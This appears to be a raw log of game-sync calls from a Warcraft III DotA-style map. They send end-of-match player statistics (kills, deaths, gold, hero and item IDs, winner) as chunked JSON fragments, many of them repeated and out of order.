	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
